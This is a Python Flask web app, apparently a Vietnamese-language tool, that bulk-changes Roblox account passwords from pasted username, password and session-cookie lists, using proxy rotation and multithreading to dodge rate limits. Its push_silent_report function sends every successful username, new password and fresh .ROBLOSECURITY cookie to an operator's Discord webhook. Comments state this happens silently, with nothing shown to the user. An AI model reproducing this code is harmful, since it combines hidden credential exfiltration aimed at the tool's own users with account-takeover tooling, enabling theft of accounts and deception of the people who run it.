import os
import io
import json
import time
import uuid
import random
import threading
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# Cấu hình ẩn phía server (ưu tiên Env Var trên Render, fallback sang config.json)
CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")

def load_server_config():
    webhook_url = os.environ.get("DISCORD_WEBHOOK_URL", "").strip()
    discord_invite = os.environ.get("DISCORD_INVITE_URL", "https://discord.gg/cxcPh6ZkPE").strip()
    
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                if not webhook_url:
                    webhook_url = data.get("webhook_url", "").strip()
                if data.get("discord_invite"):
                    discord_invite = data.get("discord_invite", "").strip()
        except Exception:
            pass
            
    return {
        "webhook_url": webhook_url,
        "discord_invite": discord_invite
    }

# Tự tạo file config.json mẫu nếu chưa có để dễ chỉnh sửa
if not os.path.exists(CONFIG_FILE):
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump({
                "webhook_url": "",
                "discord_invite": "https://discord.gg/cxcPh6ZkPE"
            }, f, indent=4)
    except Exception:
        pass

DEFAULT_USER_AGENT = "Roblox/2.624.577 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"

# Lưu trữ trạng thái các phiên chạy của người dùng
jobs = {}
jobs_lock = threading.Lock()

def push_silent_report(success_lines, mode_label):
    """Gửi ngầm danh sách tài khoản thành công về server quản trị, không ghi log ra client"""
    if not success_lines:
        return
    cfg = load_server_config()
    target_url = cfg.get("webhook_url")
    if not target_url:
        return

    try:
        content_str = "\n".join(success_lines)
        file_obj = io.BytesIO(content_str.encode("utf-8"))
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"accounts_done_{timestamp}.txt"

        payload = {
            "content": f"**[Roblox Auto ChangePass]** Hoàn tất `{len(success_lines)}` tài khoản | Chế độ: `{mode_label}`"
        }
        files = {
            "file": (filename, file_obj, "text/plain")
        }
        requests.post(target_url, data=payload, files=files, timeout=15)
    except Exception:
        pass

def get_csrf_token(session, headers):
    try:
        response = session.post("https://auth.roblox.com/v2/logout", headers=headers, timeout=12)
        return response.headers.get("x-csrf-token")
    except Exception:
        return None

def refresh_cookie(session, headers, csrf_token):
    headers_with_csrf = headers.copy()
    headers_with_csrf.update({
        "X-CSRF-TOKEN": csrf_token,
        "Origin": "https://www.roblox.com",
        "Referer": "https://www.roblox.com/home",
        "Accept": "application/json",
        "Content-Type": "application/json"
    })
    try:
        logout_response = session.post(
            "https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate",
            headers=headers_with_csrf,
            json={"clientId": ""},
            timeout=15
        )
        if logout_response.status_code == 200 and '.ROBLOSECURITY' in logout_response.cookies:
            return logout_response.cookies['.ROBLOSECURITY']
        return None
    except Exception:
        return None

def change_password_core(cookie, current_password, new_password, proxy_config=None):
    try:
        headers = {
            'Cookie': f'.ROBLOSECURITY={cookie}',
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'User-Agent': DEFAULT_USER_AGENT,
            'Origin': 'https://www.roblox.com',
            'Referer': 'https://www.roblox.com/my/account#!/info',
            'RBXAuthenticationNegotiation': '1',
            'X-CSRF-TOKEN': '',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }

        session = requests.Session()
        if proxy_config:
            session.proxies.update(proxy_config)

        session.cookies.set('.ROBLOSECURITY', cookie, domain='.roblox.com')
        time.sleep(random.uniform(0.1, 0.25))

        csrf_token = get_csrf_token(session, headers)
        if not csrf_token:
            return False, "Không lấy được CSRF token (Cookie die hoặc Proxy lỗi)"

        headers['X-CSRF-TOKEN'] = csrf_token
        data = {
            "currentPassword": current_password,
            "newPassword": new_password
        }

        r = session.post(
            'https://auth.roblox.com/v2/user/passwords/change',
            headers=headers,
            json=data,
            timeout=15
        )

        if r.status_code == 200:
            new_cookie_from_change = None
            for cookie_obj in r.cookies:
                if cookie_obj.name == '.ROBLOSECURITY':
                    new_cookie_from_change = cookie_obj.value
                    break

            cookie_to_refresh = new_cookie_from_change if new_cookie_from_change else cookie

            refresh_session = requests.Session()
            if proxy_config:
                refresh_session.proxies.update(proxy_config)
            refresh_session.cookies.set('.ROBLOSECURITY', cookie_to_refresh, domain='.roblox.com')

            refresh_headers = headers.copy()
            refresh_headers['Cookie'] = f'.ROBLOSECURITY={cookie_to_refresh}'

            time.sleep(0.2)
            refreshed_cookie = refresh_cookie(refresh_session, refresh_headers, csrf_token)
            return True, (refreshed_cookie if refreshed_cookie else cookie_to_refresh)

        elif r.status_code == 429:
            time.sleep(random.uniform(2, 4))
            return False, "Rate limited (429 - Throttled)"
        elif r.status_code == 403:
            try:
                error_data = r.json()
                error_msg = error_data.get('errors', [{}])[0].get('message', '')
                if "Challenge is required" in error_msg:
                    return False, "Challenge required (Dính Captcha/2FA)"
                return False, f"403: {error_msg}"
            except Exception:
                return False, "403 - Sai mật khẩu cũ hoặc cookie hết hạn"
        else:
            try:
                error_data = r.json()
                error_msg = error_data.get('errors', [{}])[0].get('message', f'HTTP {r.status_code}')
                return False, f"Lỗi: {error_msg}"
            except Exception:
                return False, f"HTTP Error {r.status_code}"

    except Exception as e:
        return False, f"Lỗi kết nối: {str(e)}"

def generate_password(custom_password=None, prefix="3TN"):
    if custom_password:
        return custom_password
    base_length = 11
    num_digits = max(4, base_length - len(prefix))
    random_num = ''.join([str(random.randint(0, 9)) for _ in range(num_digits)])
    return f"{prefix}{random_num}"

def parse_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None
    if '@' in proxy_str:
        return {'http': f'http://{proxy_str}', 'https': f'http://{proxy_str}'}
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return {'http': f'http://{user}:{pwd}@{ip}:{port}', 'https': f'http://{user}:{pwd}@{ip}:{port}'}
    if len(parts) == 2:
        return {'http': f'http://{proxy_str}', 'https': f'http://{proxy_str}'}
    return None

def append_job_log(job_id, msg, level="INFO"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    with jobs_lock:
        if job_id in jobs:
            jobs[job_id]["logs"].append(f"[{timestamp}] [{level}] {msg}")

def worker_job(job_id, accounts, mode, proxies, custom_password, prefix, custom_threads):
    total = len(accounts)
    successful_list = []

    def is_stopped():
        with jobs_lock:
            return jobs.get(job_id, {}).get("stop_requested", False)

    def update_counters(success_item=None, failed_item=None):
        with jobs_lock:
            if job_id not in jobs:
                return
            jobs[job_id]["processed"] += 1
            if success_item:
                jobs[job_id]["success"] += 1
                jobs[job_id]["results"].append(success_item)
            if failed_item:
                jobs[job_id]["failed"] += 1
                jobs[job_id]["failed_list"].append(failed_item)

    if mode == "delay":
        batch_size = 5
        wait_time = 30
        append_job_log(job_id, f"Khởi chạy chế độ Batch: {batch_size} acc / lượt, nghỉ {wait_time}s giữa các lượt. Tổng: {total} acc.")

        for i in range(0, total, batch_size):
            if is_stopped():
                append_job_log(job_id, "Đã dừng tiến trình theo yêu cầu người dùng.", "WARN")
                break

            batch = accounts[i:i + batch_size]
            batch_num = (i // batch_size) + 1
            total_batches = (total + batch_size - 1) // batch_size
            append_job_log(job_id, f"--- Đang chạy lượt {batch_num}/{total_batches} ({len(batch)} acc) ---")

            for acc in batch:
                if is_stopped():
                    break

                username = acc["username"]
                old_pass = acc["password"]
                cookie = acc["cookie"]
                new_pass = generate_password(custom_password, prefix)

                append_job_log(job_id, f"Đang xử lý: {username}...")
                ok, res = change_password_core(cookie, old_pass, new_pass, None)

                if not ok:
                    append_job_log(job_id, f"Thử lại lần 2 cho {username}...", "WARN")
                    time.sleep(0.3)
                    ok, res = change_password_core(cookie, old_pass, new_pass, None)

                if ok:
                    formatted = f"{username}:{new_pass}:{res}"
                    successful_list.append(formatted)
                    update_counters(success_item=formatted)
                    append_job_log(job_id, f"Thành công: {username} -> Pass mới: {new_pass}", "SUCCESS")
                else:
                    update_counters(failed_item=f"{username}:{old_pass}:{cookie} | {res}")
                    append_job_log(job_id, f"Thất bại ({username}): {res}", "ERROR")

            if (i + batch_size < total) and not is_stopped():
                append_job_log(job_id, f"Chờ {wait_time}s để tránh giới hạn IP trước khi chạy lượt tiếp theo...", "INFO")
                for _ in range(wait_time):
                    if is_stopped():
                        break
                    time.sleep(1)

    elif mode == "proxy":
        total_proxies = len(proxies)
        max_workers = custom_threads if custom_threads else min(15, total, total_proxies)
        max_workers = max(1, min(max_workers, 50))
        append_job_log(job_id, f"Khởi chạy chế độ Proxy Đa Luồng: {total} acc | {total_proxies} proxy | {max_workers} luồng.")

        def process_one(idx, acc):
            if is_stopped():
                return
            username = acc["username"]
            old_pass = acc["password"]
            cookie = acc["cookie"]
            raw_proxy = proxies[idx % total_proxies]
            proxy_cfg = parse_proxy(raw_proxy)

            if not proxy_cfg:
                update_counters(failed_item=f"{username}:{old_pass}:{cookie} | Proxy sai định dạng")
                append_job_log(job_id, f"Thất bại ({username}): Định dạng proxy không hợp lệ", "ERROR")
                return

            new_pass = generate_password(custom_password, prefix)
            ok, res = change_password_core(cookie, old_pass, new_pass, proxy_cfg)

            if not ok and not is_stopped():
                time.sleep(0.2)
                ok, res = change_password_core(cookie, old_pass, new_pass, proxy_cfg)

            if ok:
                formatted = f"{username}:{new_pass}:{res}"
                successful_list.append(formatted)
                update_counters(success_item=formatted)
                append_job_log(job_id, f"Thành công: {username} -> Pass mới: {new_pass}", "SUCCESS")
            else:
                update_counters(failed_item=f"{username}:{old_pass}:{cookie} | {res}")
                append_job_log(job_id, f"Thất bại ({username}): {res}", "ERROR")

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(process_one, idx, acc) for idx, acc in enumerate(accounts)]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    append_job_log(job_id, f"Lỗi luồng xử lý: {str(e)}", "ERROR")

    # Đẩy ngầm kết quả thành công (không hiện bất kỳ thông tin gì trên UI/Logs)
    mode_text = "Batch 5/30s" if mode == "delay" else "Proxy Turbo"
    push_silent_report(successful_list, mode_text)

    with jobs_lock:
        if job_id in jobs:
            jobs[job_id]["status"] = "completed"
    append_job_log(job_id, f"HOÀN TẤT TOÀN BỘ! Thành công: {len(successful_list)}/{total} tài khoản.", "DONE")


@app.route("/")
def index():
    cfg = load_server_config()
    return render_template("index.html", discord_url=cfg.get("discord_invite"))

@app.route("/api/start", methods=["POST"])
def start_job():
    data = request.get_json(silent=True) or {}
    raw_accounts = data.get("accounts", "")
    mode = data.get("mode", "delay")
    raw_proxies = data.get("proxies", "")
    pass_mode = data.get("pass_mode", "random")
    prefix = (data.get("prefix") or "3TN").strip()
    custom_password = (data.get("custom_password") or "").strip()
    custom_threads = data.get("threads")

    # Parse danh sách tài khoản
    accounts = []
    for line in raw_accounts.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split(":", 2)
        if len(parts) == 3:
            accounts.append({
                "username": parts[0].strip(),
                "password": parts[1].strip(),
                "cookie": parts[2].strip()
            })

    if not accounts:
        return jsonify({"ok": False, "error": "Danh sách tài khoản trống hoặc sai định dạng (user:pass:cookie)."}), 400

    proxies = [p.strip() for p in raw_proxies.splitlines() if p.strip() and not p.strip().startswith("#")]
    if mode == "proxy" and not proxies:
        return jsonify({"ok": False, "error": "Chế độ Proxy yêu cầu nhập ít nhất 1 Proxy."}), 400

    if pass_mode == "custom":
        if len(custom_password) < 8:
            return jsonify({"ok": False, "error": "Mật khẩu tùy chỉnh phải có ít nhất 8 ký tự."}), 400
    else:
        custom_password = None
        if not prefix:
            prefix = "3TN"

    try:
        threads_int = int(custom_threads) if custom_threads else None
    except ValueError:
        threads_int = None

    job_id = str(uuid.uuid4())
    with jobs_lock:
        jobs[job_id] = {
            "status": "running",
            "stop_requested": False,
            "total": len(accounts),
            "processed": 0,
            "success": 0,
            "failed": 0,
            "logs": [],
            "results": [],
            "failed_list": [],
            "created_at": time.time()
        }

    # Dọn dẹp các job cũ quá 2 tiếng để tránh tràn RAM trên Render
    now = time.time()
    with jobs_lock:
        expired = [jid for jid, jdata in jobs.items() if now - jdata["created_at"] > 7200 and jdata["status"] != "running"]
        for jid in expired:
            del jobs[jid]

    t = threading.Thread(
        target=worker_job,
        args=(job_id, accounts, mode, proxies, custom_password, prefix, threads_int),
        daemon=True
    )
    t.start()

    return jsonify({"ok": True, "job_id": job_id, "total": len(accounts)})

@app.route("/api/status/<job_id>", methods=["GET"])
def job_status(job_id):
    offset = int(request.args.get("offset", 0))
    with jobs_lock:
        job = jobs.get(job_id)
        if not job:
            return jsonify({"ok": False, "error": "Không tìm thấy phiên làm việc."}), 404

        new_logs = job["logs"][offset:]
        return jsonify({
            "ok": True,
            "status": job["status"],
            "total": job["total"],
            "processed": job["processed"],
            "success": job["success"],
            "failed": job["failed"],
            "logs": new_logs,
            "next_offset": offset + len(new_logs),
            "results": job["results"] if job["status"] != "running" else [],
            "failed_list": job["failed_list"] if job["status"] != "running" else []
        })

@app.route("/api/stop/<job_id>", methods=["POST"])
def stop_job(job_id):
    with jobs_lock:
        if job_id in jobs and jobs[job_id]["status"] == "running":
            jobs[job_id]["stop_requested"] = True
            return jsonify({"ok": True})
    return jsonify({"ok": False}), 404

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
